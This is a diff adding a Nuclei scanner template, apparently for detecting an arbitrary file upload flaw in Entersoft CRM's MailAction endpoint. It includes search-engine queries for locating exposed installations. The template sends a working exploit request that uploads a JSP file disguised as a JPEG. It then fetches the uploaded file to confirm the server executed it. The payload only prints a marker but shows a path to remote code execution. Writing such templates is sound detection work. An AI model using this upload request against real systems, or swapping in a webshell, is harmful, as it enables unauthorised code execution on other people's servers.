@@ -1,0 +1,53 @@
+id: zdet_entersoft_crm_mailaction_upload
+
+info:
+  name: zdet_entersoft_crm_mailaction_upload
+  author: Anonymous
+  severity: critical
+  description: 浙大恩特CRM MailAction 文件上传
+  metadata:
+    max-request: 1
+    fofa-query: title="欢迎使用浙大恩特客户资源管理系统"
+    quake-query: title:"欢迎使用浙大恩特客户资源管理系统"
+    veified: true
+  tags: upload,intrusive,others
+variables:
+  payload1: '{{rand_base(6)}}'
+  payload2: '<%out.print("{{payload1}}");%>'
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysdeDe4ds41V
+        Content-Length: 203
+
+        ------WebKitFormBoundarysdeDe4ds41V
+        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        {{payload2}}
+        ------WebKitFormBoundarysdeDe4ds41V--
+      - |
+        GET {{name1}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: name1
+        regex:
+          - "/enterdoc/.*?.jsp"
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200
+          - status_code_2==200
+          - contains(body_2, '{{payload1}}')
+        condition: and
+# digest: 4a0a00473045022100c9ec608cd67992778213a56c9dabf44f89e7369af613120ba32da71cb712c9bc02206c13de4dfb7f96aba37297f5619284752510a09c987d3e7d391141824fac75e4:6b2dd5af372f02ed15a56faf8ad98cf9
